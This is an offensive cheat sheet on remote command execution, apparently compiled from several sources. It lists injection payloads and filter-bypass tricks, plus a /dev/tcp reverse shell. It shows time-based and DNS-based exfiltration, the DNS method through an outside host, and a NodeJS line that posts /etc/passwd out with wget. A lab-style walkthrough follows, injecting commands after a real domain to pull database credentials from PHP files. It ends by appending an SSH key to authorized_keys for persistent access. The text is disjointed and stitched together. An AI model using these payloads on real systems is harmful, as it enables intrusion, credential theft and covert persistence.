# _GOT RCE?
# Remote Commands Execution
        - Remote Commands execution is a security vulnerability that allows an attacker to execute Commandss from a remote server.
        ## Exploits
###   Normal Commands execution, execute the command and voila :p
- cat /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```
###   Commands execution by chaining commands
                - original_cmd_by_server; ls
                - original_cmd_by_server && ls
                - original_cmd_by_server | ls
                - original_cmd_by_server || ls    Only if the first cmd fail
###   Commands execution inside a command
                - original_cmd_by_server `cat /etc/passwd`
                - original_cmd_by_server $(cat /etc/passwd)
###   Commands execution without space - Linux
#### swissky@crashlab:~/Www$ cat</etc/passwd
                    - root:x:0:0:root:/root:/bin/bash
#### swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
                    - root:x:0:0:root:/root:/bin/bash
                    - daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
#### swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
                    - root:x:0:0:root:/root:/bin/bash
                    - daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
#### swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
                    - RCE
                    - root:x:0:0:root:/root:/bin/bash
                    - daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
#### swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
                    - Linux crashlab 4.4.X-XX-generic #72-Ubuntu
                - swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
###   Commands execution without space - Windows
                - ping%CommonProgramFiles:~10,-18%IP
                - ping%PROGRAMFILES:~10,-5%IP
###   Commands execution without spaces, $ or { } - Linux (Bash only)
                - IFS=,;`cat<<<uname,-a`
###   Commands execution with a line return
                - something%0Acat%20/etc/passwd
###   Bypass blacklisted word with single quote
                - w'h'o'am'i
###   Bypass blacklisted word with double quote
                - w"h"o"am"i
###   Bypass blacklisted word with $@
                - who$@ami
###   Bypass zsh/bash/sh blacklist
                - echo $0
                - -> /usr/bin/zsh
                - echo whoami|$0
        ▾ Time based data exfiltration
            - Extracting data : char by char
               swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real	0m5.007s
user	0m0.000s
sys	0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real	0m0.002s
user	0m0.000s
sys	0m0.000s

        ▾ DNS based data exfiltration
###   Based on the tool from https://github.com/HoLyVieR/dnsbin also hosted at dnsbin.zhack.ca
                - 1. Go to http://dnsbin.zhack.ca/
                - 2. Execute a simple 'ls'
                - for i in $(ls /) ; do host "http://$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
        ▾ Environment based
            - NodeJS Commands execution
               require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
        ▾ Thanks to
###   SECURITY CAFÉ - Exploiting Timed Based RCE
               https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/
                - https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/
###   Bug Bounty Survey - Windows RCE spaceless
               https://twitter.com/bugbsurveys/status/860102244171227136
                - https://twitter.com/bugbsurveys/status/860102244171227136
###   No PHP, no spaces, no $, no { }, bash only - @asdizzle
               https://twitter.com/asdizzle_/status/895244943526170628
                - https://twitter.com/asdizzle_/status/895244943526170628
    ▾ Stuff to do with RCE:
        ▾ Section 9: Database Reconnaissance
###   Discover the Database Engine using the /etc/passwd file
                - www.cnn.com; cat /etc/passwd | egrep -i '(postgres|sql|db2|ora)'
                - MySQL is the database engine
###   Discover the Database Engine using the "ps" command
                - Notes(FYI):
                - Let's use the "ps" command to search for the following process strings: postgres, sql, db2 and ora.
                - Instructions:
                - Hostname/IP:
                - www.cnn.com; ps -eaf | egrep -i '(postgres|sql|db2|ora)'
                - View your Results
                - The mysqld (daemon) is running.
        ▾ Section 10: Database Interrogation
###   List all php scripts
                - Our next step is to try to figure out if any of the php scripts located under /var/www/html/mutillidae contain a database username and password.
                - But, first list all the php scripts.
                - www.cnn.com; find /var/www/html/mutillidae -name "*.php"
                - There is over 900+ php scripts.
###   Search php scripts for the string password
                - Now we will search the 900+ php scripts for the string "password" and "=".
                - www.cnn.com; find /var/www/html/mutillidae -name "*.php" | xargs grep -i "password" | grep "="
                - View your Results (Continue to next step).
###   Obtain password from search results
                - Now you have to look closely to see the string password and the actual password "samurai".
                - Notice that the MySQLHandler.php contains the following string:
                - $mMySQLDatabasePassword = "samurai";
###   Search MySQLHandler.php for the strings user OR login
                - We now know that MySQLHandler.php contains the database password.
                - The only thing left it to obtain the database username for the password samarai.
                - www.cnn.com; find /var/www/html/mutillidae -name "MySQLHandler.php" | xargs egrep -i '(user|login)' | grep "="
                - View your Results (Continue to next step).
###   Obtain username from search results
                - Notice that the MySQLHandler.php contains the following string:
                - $mMySQLDatabaseUsername = "root";
                - Notice the MySQL connection method.
                - mMySQLConnection = new mysqli($HOSTNAME, $USERNAME, $SAMURAI_WTF_PASSWORD);
###   Display MySQLHandler.php
                - I guess I could have showed you this first, but good things come to those that wait.
                - It is possible to display the contents of the MySQLHandler.php program, by encoding the "<?php" and "?>" tags.  These tags tell apache to execute a php script.  To get around this problem and just display the text of the program, we change "<" to "&#60;" and ">" to "&#62;".
                - www.cnn.com; find /var/www/html/mutillidae -name "MySQLHandler.php" | xargs cat | sed 's/</\&#60;/g' | sed 's/>/\&#62;/g'
                - View your Results (Continue to next step).
###   Viewing the Code
                - Kind of scary,,, right?
                - Typically, you should never put authentication information into a program that accesses a database on the web.
#### Database Username
                    - static public $mMySQLDatabaseUsername = "root";
#### Database Password
                    - static public $mMySQLDatabasePassword = "samurai";
#### Database Name
                    - static public $mMySQLDatabaseName = "nowasp";
    ▾ ___ssh-key
        - If we have some user shell or access, probably it would be a good idea to generate a new ssh private-public key pair using ssh-keygen
        - ssh-keygen
        ▾ Generating public/private rsa key pair.
            - Enter file in which to save the key (/home/bitvijays/.ssh/id_rsa):
            - Enter passphrase (empty for no passphrase):
            - Enter same passphrase again:
            - Your identification has been saved in /home/bitvijays/.ssh/id_rsa.
            - Your public key has been saved in /home/bitvijays/.ssh/id_rsa.pub.
        ▾ The key fingerprint is:
            - SHA256:JbdAhAIPl8qm/kCANJcpggeVoZqWnFRvVbxu2u9zc5U bitvijays@Kali-Home
            - The key's randomart image is:
            - +---[RSA 2048]----+
            - |o==*+. +=.       |
            - |=o**+ o. .       |
            - |=+...+  o +      |
            - |=.* .    * .     |
            - |oO      S .     .|
            - |+        o     E.|
            - |..      +       .|
            - | ..    . . . o . |
            - |  ..      ooo o  |
            - +----[SHA256]-----+
        ▾ Copy/ Append the public part to /home/user/.ssh/authorized_keys
            - cat /home/bitvijays/.ssh/id_rsa.pub
            - echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+tbCpnhU5qQm6typWI52FCin6NDYP0hmQFfag2kDwMDIS0j1ke/kuxfqfQKlbva9eo6IUaCrjIuAqbsZTsVjyFfjzo/hDKycR1M5/115Jx4q4v48a7BNnuUqi +qzUFjldFzfuTp6XM1n+Y1B6tQJJc9WruOFUNK2EX6pmOIkJ8QPTvMXYaxwol84MRb89V9vHCbfDrbWFhoA6hzeQVtI01ThMpQQqGv5LS+rI0GVlZnT8cUye0uiGZW7ek9DdcTEDtMUv1Y99zivk4FJmQWLzxplP5dUJ1NH5rm6YBH8CoQHLextWc36Ih18xsyzW8qK4Bfl4sOtESHT5/3PlkQHN bitvijays@Kali-Home" >> /home/user/.ssh/authorized_keys
        ▾ Now, ssh to the box using that user.
            - ssh user@hostname -i id_rsa
